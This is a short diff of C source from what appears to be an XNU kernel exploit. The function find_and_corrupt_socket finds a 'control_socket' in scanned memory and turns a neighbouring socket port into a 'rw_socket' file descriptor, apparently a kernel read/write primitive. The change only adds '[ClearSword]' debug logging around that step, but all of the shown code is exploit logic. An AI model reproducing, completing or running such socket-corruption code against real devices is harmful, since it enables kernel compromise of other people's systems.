@@ -249,9 +249,17 @@ kern_return_t find_and_corrupt_socket(mach_port_t memory_object, mach_vm_offset_
     if (marker != 0xffffffffffffffff) {
         LOG("found control_socket at idx: %#zx", control_socket_idx);
         g_ctx.control_socket = sock;
-        // the PREVIOUS element in the list is NEXT in the list, because NEW inpcb are inserted at the head of the list
-        // turn rw_socket back to fd
-        g_ctx.rw_socket = fileport_makefd(g_ctx.socket_ports[control_socket_idx + 1]);
+
+        LOG("[ClearSword] BEFORE fileport_makefd");
+
+        mach_port_t rw_port = g_ctx.socket_ports[control_socket_idx + 1];
+
+        LOG("[ClearSword] rw_port = %#x", rw_port);
+
+        g_ctx.rw_socket = fileport_makefd(rw_port);
+
+        LOG("[ClearSword] AFTER fileport_makefd: fd=%d", g_ctx.rw_socket);
+
         return KERN_SUCCESS;
     }
 
